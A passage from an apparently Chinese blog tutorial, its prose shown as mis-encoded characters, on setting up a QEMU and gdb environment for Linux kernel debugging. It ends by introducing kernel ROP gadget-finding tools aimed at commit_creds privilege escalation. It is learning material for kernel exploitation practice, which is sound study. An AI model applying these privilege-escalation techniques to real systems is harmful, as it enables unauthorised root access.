	<span class="comment">//è¶…çº§ç®¡ç†å‘˜å·¥å…·</span></span><br><span class="line">â”œâ”€â”€ sys</span><br><span class="line">â””â”€â”€ usr</span><br></pre></td></tr></table></figure>

<p>å†…å­˜æ–‡ä»¶ç³»ç»Ÿä¹Ÿå­˜æ”¾åœ¨ç£ç›˜ä¸Š,é€šå¸¸åœ¨&#x2F;boot&#x2F;initrd.img</p>
<p>å®é™…ä¸Šå°±æ˜¯ä¸Šè¿°ç›®å½•æ ‘æ‰“åŒ…åçš„å½’æ¡£æ–‡ä»¶</p>
<p>è¿™å°±æ„å‘³ç€,kernelå¼€å§‹å¯åŠ¨ä¹‹å‰,å†…å­˜æ–‡ä»¶ç³»ç»Ÿå·²ç»è¢«è§£åŒ…å¹¶ä¸”æ¬åˆ°å†…å­˜é‡Œå»äº†</p>
<p>è¿™å°±æ„å‘³ç€,å¾—æœ‰ä¸€ä¸ªä¸œè¥¿,å®ƒçŸ¥é“ç£ç›˜ä¸Šçš„æ–‡ä»¶ç³»ç»Ÿæ ¼å¼æ¯”å¦‚ext4,å¹¶ä¸”èƒ½æ­£ç¡®è®¿é—®åˆ°&#x2F;boot&#x2F;initrd.img,å¹¶ä¸”èƒ½è§£åŒ….</p>
<p>è¿™ä¸ªä¸œè¥¿å°±æ˜¯grub</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯åŠ¨è¿‡ç¨‹:mbr-&gt;grub-&gt;kernel</span><br></pre></td></tr></table></figure>

<p>å†…æ ¸ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿèµ·æ¥ä¹‹å,ä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿçš„initè„šæœ¬ä¼šè§„å®šæ­¤é˜¶æ®µå†…æ ¸åº”è¯¥å¹²ä»€ä¹ˆ,æŒ‚è½½ç¡¬ç›˜å°±æ˜¯è¿™æ—¶å€™å‘ç”Ÿçš„</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/busybox-1.36.1/_install# <span class="built_in">cat</span> init</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">insmod /ktest.ko</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé¢ä½¿ç”¨çš„å‘½ä»¤æ¯”å¦‚insmodå°±æ˜¯ä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿæä¾›çš„</p>
<p>å¦‚æœåç»­è¦æŒ‚è½½ç£ç›˜é¦–å…ˆéœ€è¦è®©å†…æ ¸çŸ¥é“ç£ç›˜ä¸Šçš„æ–‡ä»¶ç³»ç»Ÿæ ¼å¼,æ¯”å¦‚ext2</p>
<p>ä¹Ÿå°±æ˜¯è¯´insmod ext2ä¹‹å,å†…æ ¸æ‰èƒ½è¯†åˆ«å¹¶è®¿é—®ext2æ ¼å¼åŒ–çš„ç£ç›˜.</p>
<p>å³æ—¶ç£ç›˜ä¸Šçš„æ–‡ä»¶ç³»ç»Ÿä¸­æœ‰ext2æ¨¡å—,æœ‰insmodå‘½ä»¤,ä½†æ˜¯æ­¤æ—¶è¿˜æ²¡æœ‰æŒ‚è½½,æ²¡æ³•ä½¿ç”¨</p>
<p>å› æ­¤åªèƒ½æ˜¯ä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿæä¾›è¿™ä¸ªåŠŸèƒ½</p>
<p>ä¹Ÿå°±æ˜¯è¯´,å†…å­˜æ–‡ä»¶ç³»ç»Ÿä¸ºå†…æ ¸æä¾›äº†ä¸€å¥—å¿…è¦çš„è®¿é—®ç£ç›˜çš„å·¥å…·</p>
<p>è‡³äºä¸ºä»€ä¹ˆå«åšâ€å†…å­˜æ–‡ä»¶ç³»ç»Ÿâ€,å› ä¸ºæ•´ä¸ªinitrd.imgæ–‡ä»¶å¾ˆå°,ä¼šè¢«å…¨éƒ¨åŠ è½½è¿›å…¥å†…å­˜,å› æ­¤è®¿é—®é€Ÿåº¦å¾ˆå¿«</p>
<h4 id="åˆ¶ä½œlinuxä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿ"><a href="#åˆ¶ä½œlinuxä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="åˆ¶ä½œlinuxä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿ"></a>åˆ¶ä½œlinuxä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿ</h4><p>å¯ä»¥ç›´æ¥ä½¿ç”¨busybox</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://gitee.com/add358/busybox.git</span><br><span class="line">cd busybox</span><br></pre></td></tr></table></figure>

<p>ç„¶åmake menuconfig,</p>
<p>Settings-&gt;Build Options-&gt;Build static binary(no shared libs)é€‰ä¸Š</p>
<p>è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯å°†busyboxé™æ€é“¾æ¥,å¯ä»¥è„±ç¦»glibcç¯å¢ƒè¿è¡Œ,å› ä¸ºå†…å­˜æ–‡ä»¶ç³»ç»Ÿå¾ˆå°,ä¸éœ€è¦glibc</p>
<p>Applets-&gt;Linux System Utilities-&gt;Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)ä¸é€‰</p>
<p>è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯è®¾ç½®ä¸æŒ‚è½½ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿ,ä¸ºäº†ç²¾ç®€å¤§å°</p>
<p>Applets-&gt;Networking Utilities-&gt;inetdä¸é€‰</p>
<p>è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯ä¸ä½¿ç”¨ç½‘ç»œ,ä¸ºäº†ç²¾ç®€å¤§å°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j$(nproc)</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>make installä¹‹åä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª<code>_install</code>ç›®å½•</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox/_install# <span class="built_in">ls</span></span><br><span class="line">bin  linuxrc  sbin  usr</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´,busyboxæä¾›äº†bin,sbin,usrä¸‰ä¸ªç›®å½•çš„åŠŸèƒ½</p>
<p>usrä¸‹é¢çš„binå’Œsbinå®é™…ä¸Šæ˜¯_installç›®å½•ä¸‹ä¸¤ä¸ªåŒåç›®å½•çš„é“¾æ¥</p>
<p>ç„¶åbin,sbiné‡Œé¢çš„å·¥å…·,ä¹Ÿå…¨æ˜¯åˆ°bin&#x2F;busyboxçš„é“¾æ¥</p>
<p>ä¹Ÿå°±æ˜¯è¯´,ç”Ÿæˆäº†ä¸€ä¸ªbusyboxå¯æ‰§è¡Œç¨‹åº,åˆ›å»ºäº†ä¸€å¤§å †é“¾æ¥</p>
<p>è‡³äºsys,devç­‰ç›®å½•ä»–ä¸ç®¡,æˆ‘ä»¬å€ŸåŠ©è¿™ä¸ªåŠæˆå“åŠ ä¸Šè¿™å‡ ä¸ªç›®å½•å°±å¯ä»¥æ„é€ ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºinitè„šæœ¬,è§„å®šå†…æ ¸å¯åŠ¨æ—¶è¦å¹²å•¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>æ”¹ä¸€ä¸‹æ–‡ä»¶æƒé™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x init</span><br></pre></td></tr></table></figure>

<p>ä¹‹ååœ¨_installç›®å½•æ‰“åŒ…æ•´ä¸ªä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox/_install<span class="meta"># find . | cpio -o --format=newc &gt; ../rootfs.img</span></span><br><span class="line"><span class="number">5949</span> blocks</span><br></pre></td></tr></table></figure>

<p>è¿™ä¼šåœ¨ä¸Šçº§ç›®å½•ç”Ÿæˆä¸€ä¸ªrootfs.imgå½’æ¡£æ–‡ä»¶</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox/_install# <span class="built_in">cd</span> ..</span><br><span class="line">root@Destroyer:/home/dustball/busybox# file rootfs.img</span><br><span class="line">rootfs.img: ASCII cpio archive (SVR4 with no CRC)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥ä½œä¸ºä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿäº†</p>
<h3 id="å¯åŠ¨å†…æ ¸"><a href="#å¯åŠ¨å†…æ ¸" class="headerlink" title="å¯åŠ¨å†…æ ¸"></a>å¯åŠ¨å†…æ ¸</h3><p>æŠŠå¯ä»¥å¼•å¯¼çš„å†…æ ¸é•œåƒbzImageä¹Ÿæ¬åˆ°rootfs.imgæ‰€åœ¨çš„ç›®å½•æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox# cp /usr/src/linux-6.7/arch/x86/boot/bzImage .</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå¯ä»¥ç”¨qemuå¯åŠ¨å†…æ ¸äº†</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    -cpu kvm64 </span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ²¡èµ·æ¥,æŠ¥å‘Šæ‰¾ä¸åˆ°&#x2F;dev&#x2F;tty,å¯èƒ½æ˜¯initè„šæœ¬æ²¡æœ‰ç»™æ‰§è¡Œæƒé™</p>
<p>-mæŒ‡å®šä½¿ç”¨å†…å­˜å¤§å°</p>
<p>-kernelæŒ‡å®šå†…æ ¸é•œåƒæ–‡ä»¶</p>
<p>-initrdæŒ‡å®šä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿæ–‡ä»¶</p>
<p>-appendæŒ‡å®šå¯åŠ¨å‚æ•°,</p>
<blockquote>
<p>root&#x3D;&#x2F;dev&#x2F;ram,æ ¹æ–‡ä»¶ç³»ç»Ÿä¹Ÿä½¿ç”¨ä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿ rwå¯è¯»å†™</p>
<p>console&#x3D;ttyS0,æŒ‡å®šä¸²å£ç»ˆç«¯0,æ”¹æˆtty0æˆ–è€…ttyS1éƒ½çœ‹ä¸åˆ°è¾“å‡º,è¿˜ä¸æ¸…æ¥šåŸå› </p>
<p>oops&#x3D;panic panic1 æŒ‡å®šå‘ç”Ÿoopså¼‚å¸¸æ—¶,åº”è¯¥è§¦å‘å†…æ ¸å´©æºƒ</p>
<p>nokaslr,æ–¹ä¾¿è°ƒè¯•å…³é—­å†…æ ¸åœ°å€éšæœºåŒ–</p>
</blockquote>
<h4 id="å†…å­˜æ–‡ä»¶ç³»ç»Ÿç¼–è¯‘è¿›å†…æ ¸"><a href="#å†…å­˜æ–‡ä»¶ç³»ç»Ÿç¼–è¯‘è¿›å†…æ ¸" class="headerlink" title="å†…å­˜æ–‡ä»¶ç³»ç»Ÿç¼–è¯‘è¿›å†…æ ¸"></a>å†…å­˜æ–‡ä»¶ç³»ç»Ÿç¼–è¯‘è¿›å†…æ ¸</h4><p>ä¹‹å‰çš„å†…æ ¸æ˜¯ä¸€ä¸ªè£¸æ ¸,å†…å­˜æ–‡ä»¶ç³»ç»Ÿæ˜¯å•ç‹¬åˆ¶ä½œç„¶åç”¨qemuå¯åŠ¨çš„</p>
<p>å¯ä»¥ç›´æ¥ç¼–è¯‘è¿›å†…æ ¸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/OnlyLove_/article/details/124565282</span><br></pre></td></tr></table></figure>

<p>åå¤„æ˜¯å¦‚æœæƒ³è¦ä¿®æ”¹æ–‡ä»¶ç³»ç»Ÿ,éœ€è¦é‡æ–°ç¼–è¯‘å†…æ ¸</p>
<h3 id="è°ƒè¯•å†…æ ¸"><a href="#è°ƒè¯•å†…æ ¸" class="headerlink" title="è°ƒè¯•å†…æ ¸"></a>è°ƒè¯•å†…æ ¸</h3><p>å¯åŠ¨å†…æ ¸æ—¶åŠ ä¸Šè°ƒè¯•é€‰é¡¹-s,è¿™æ ·å°±ä¼šåœ¨127.0.0.1:1234ä¸Šå¼€å¯ç›‘å¬ç«¯å£</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯åŠ¨,å†å¼€ä¸€ä¸ªç»ˆç«¯,ç”¨gdbå°±å¯ä»¥è¿œç¨‹è°ƒè¯•äº†</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure>



<h4 id="æ·»åŠ è°ƒè¯•ä¿¡æ¯"><a href="#æ·»åŠ è°ƒè¯•ä¿¡æ¯" class="headerlink" title="æ·»åŠ è°ƒè¯•ä¿¡æ¯"></a>æ·»åŠ è°ƒè¯•ä¿¡æ¯</h4><p>ç”¨äºå¼•å¯¼çš„bzImageå·²ç»å»æ‰äº†è°ƒè¯•ä¿¡æ¯,å¦‚æœç›´æ¥ç”¨gdbç»™start_kernelè¿™ç§å‡½æ•°ä¸‹æ–­ç‚¹,æ‰¾ä¸åˆ°ç¬¦å·</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b start_kernel</span><br><span class="line">No symbol table is loaded.  Use the <span class="string">&quot;file&quot;</span> <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>

<p>vmlinuxä¸­ä¿ç•™æœ‰è°ƒè¯•ä¿¡æ¯(ç¼–è¯‘æ—¶ä¿ç•™äº†è°ƒè¯•ä¿¡æ¯æ¯”å¦‚dwarf5),å°†å…¶ä½œä¸ºè°ƒè¯•ç¬¦å·æ¥æº</p>
<p>é¦–å…ˆéœ€è¦çŸ¥é“å°†vmlinuxæ·»åŠ åˆ°å“ªé‡Œ,ä¹Ÿå°±æ˜¯å†…æ ¸åœ¨å†…å­˜ä¸­çš„åœ°å€</p>
<p>åœ¨gdbä¸Šcä¸€ä¸‹è®©è°ƒè¯•å†…æ ¸èƒ½å¤Ÿè‡ªç”±æ‰§è¡Œ,ç„¶ååœ¨è¢«è°ƒè¯•çš„å†…æ ¸ä¸Š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc # cat /proc/iomem | grep &quot;Kernel code&quot;</span><br><span class="line">  01000000-01ffffff : Kernel code</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯å†…æ ¸åŸºåœ°å€åœ¨0x01000000</p>
<p>åœ¨gdbä¸Šæ·»åŠ è°ƒè¯•ç¬¦å·(ctrl+Cä¸­æ–­å†…æ ¸)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file ./vmlinux <span class="number">0x01000000</span></span><br><span class="line">add symbol table from file <span class="string">&quot;./vmlinux&quot;</span> at</span><br><span class="line">        .text_addr = <span class="number">0x01000000</span></span><br><span class="line">Reading symbols from ./vmlinux...done.</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå°±å¯ä»¥åœ¨å†…æ ¸å‡½æ•°ä¸Šä¸‹æ–­ç‚¹äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b start_kernel</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x1e457e0</span>: start_kernel. (<span class="number">2</span> locations)</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥æºç è°ƒè¯•å†…æ ¸äº†</p>
<h4 id="æ·»åŠ å†…æ ¸æ¨¡å—è°ƒè¯•ä¿¡æ¯"><a href="#æ·»åŠ å†…æ ¸æ¨¡å—è°ƒè¯•ä¿¡æ¯" class="headerlink" title="æ·»åŠ å†…æ ¸æ¨¡å—è°ƒè¯•ä¿¡æ¯"></a>æ·»åŠ å†…æ ¸æ¨¡å—è°ƒè¯•ä¿¡æ¯</h4><p>ç±»ä¼¼çš„æ–¹æ³•,éœ€è¦çŸ¥é“çš„æ˜¯å†…æ ¸æ¨¡å—åœ¨å†…å­˜ä¸­çš„åœ°å€,ä½œä¸ºè°ƒè¯•ç¬¦å·è¾“å…¥çš„koæ¨¡å—æ–‡ä»¶éœ€è¦ä¿ç•™è°ƒè¯•ç¬¦å·</p>
<p>è‡³äºå¦‚ä½•ä¿ç•™å†…æ ¸æ¨¡å—çš„è°ƒè¯•ç¬¦å·,éœ€è¦åŠ å…¥gccçš„ç¼–è¯‘é€‰é¡¹-g,<code>CFLAGS_MODULE=-g</code></p>
<p>Makefileè¿™æ ·å†™</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/kd# <span class="built_in">cat</span> Makefile</span><br><span class="line">obj-m += ktest.o</span><br><span class="line"></span><br><span class="line">KDIR = /usr/src/linux-6.7</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">        $(MAKE) -C $(KDIR) M=$(PWD) modules CFLAGS_MODULE=-g</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">        <span class="built_in">rm</span> -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure>

<p>æ–°ç¼–è¯‘å¥½çš„å†…æ ¸æ¨¡å—,æ³¨æ„æ”¾åˆ°<code>_install</code>ä¸‹é¢ä¹‹åé‡æ–°cpioæ‰“åŒ…</p>
<p>ç»™å†…æ ¸æ¨¡å—æ·»åŠ è°ƒè¯•ç¬¦å·,é¦–å…ˆéœ€è¦çŸ¥é“è¯¥æ¨¡å—è¢«åŠ è½½åˆ°å†…å­˜çš„åœ°å€</p>
<p>åœ¨gdbä¸Šcä¸€ä¸‹è®©å†…æ ¸ç»§ç»­</p>
<p>ç„¶ååœ¨è¢«è°ƒè¯•çš„å†…æ ¸ä¸Š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc <span class="meta"># cat /proc/modules</span></span><br><span class="line">ktest <span class="number">12288</span> <span class="number">0</span> - Live <span class="number">0xffffffffc0000000</span> (O)</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´å†…æ ¸æ¨¡å—kteståœ¨0xffffffffc0000000</p>
<p>ä¸‹é¢ä»gdbä¸Šä¸ºå…¶åŠ è½½ç¬¦å·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file ./ktest.ko 0xffffffffc0000000</span><br><span class="line">add symbol table from file &quot;./ktest.ko&quot; at</span><br><span class="line">        .text_addr = 0xffffffffc0000000</span><br><span class="line">Reading symbols from ./ktest.ko...done.</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå°±å¯ä»¥ä¸‹æ–­ç‚¹,æºç è°ƒè¯•äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b ko_test_init</span><br><span class="line">Breakpoint 2 at 0xffffffffc0000000: file /home/dustball/kd/ktest.c, line 7.</span><br></pre></td></tr></table></figure>











<h2 id="å†…æ ¸æ•°æ®ç»“æ„"><a href="#å†…æ ¸æ•°æ®ç»“æ„" class="headerlink" title="å†…æ ¸æ•°æ®ç»“æ„"></a>å†…æ ¸æ•°æ®ç»“æ„</h2><h2 id="å†…æ ¸ROP"><a href="#å†…æ ¸ROP" class="headerlink" title="å†…æ ¸ROP"></a>å†…æ ¸ROP</h2><h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><p>ç”¨æˆ·æ€ROPåˆ©ç”¨gadgetæ„é€ <code>system(&quot;/bin/sh&quot;)</code></p>
<p>å†…æ ¸ROPåˆ©ç”¨gadgetæ„é€ <code>commit_creds(&amp;init_cred)</code></p>
<h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><p>ç”¨æˆ·æ€pwné¢˜å¸¸ç”¨ROPgadget</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install python-capstone</span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/pwn2security/ROPgadget.git</span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/kd# ROPgadget --binary /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> --only <span class="string">&quot;jmp&quot;</span> | grep rsp</span><br><span class="line"><span class="number">0x00000000000010d5</span> : jmp rsp</span><br><span class="line">root@Destroyer:/home/dustball/kd# ROPgadget --binary /usr/src/linux<span class="number">-6.7</span>/vmlinux --only <span class="string">&quot;jmp&quot;</span> | grep rsp</span><br><span class="line"><span class="number">0xffffffff81220783</span> : jmp rsp</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä»å†…æ ¸vmlinuxä¸­æ‰¾gadgetæ¯”è¾ƒæ…¢</p>
<h4 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h4><p>ç±»ä¼¼äºROPgadget,ä½†æ˜¯å¬è¯´é€Ÿåº¦å¿«ç‚¹,æ²¡æœ‰éªŒè¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ropper</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/kd# ropper -f /usr/src/linux-6.7/vmlinux --search <span class="string">&quot;jmp rsp&quot;</span></span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... 88%</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: jmp rsp</span><br><span class="line">[INFO] File: /usr/src/linux-6.7/vmlinux</span><br><span class="line">0xffffffff81220783: jmp rsp;</span><br></pre></td></tr></table></figure>

<p>ropperçš„semanticåŠŸèƒ½,å¯ä»¥è¿›è¡Œç®€å•çš„é™æ€è¯­ä¹‰åˆ†æ,æ‰¾åˆ°ä»¤rax&#x3D;0è¿™ç§gadget</p>
<h4 id="extract-vmlinux"><a href="#extract-vmlinux" class="headerlink" title="extract-vmlinux"></a>extract-vmlinux</h4><p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">linux&#x2F;scripts&#x2F;extract-vmlinux at master Â· torvalds&#x2F;linux Â· GitHub</a></p>
<p>bzImageæ˜¯ä¸€ä¸ªç»è¿‡å‹ç¼©çš„å†…æ ¸,å¦‚æœæƒ³è¦å¯»æ‰¾gadget,å¿…é¡»ä½¿ç”¨ä¸€ä¸ªæœªè¢«å‹ç¼©çš„elfæ–‡ä»¶,ä¹Ÿå°±æ˜¯vmlinux</p>
<p>å¦‚æœé¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªbzImage,å¯ä»¥ç”¨extract-vmlinuxæå–vmlinux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>

























<h3 id="credç»“æ„"><a href="#credç»“æ„" class="headerlink" title="credç»“æ„"></a>credç»“æ„</h3><p>credç»“æ„ä½“ç®¡ç†è¿›ç¨‹æƒé™,ç”¨æˆ·idç­‰ä¿¡æ¯</p>
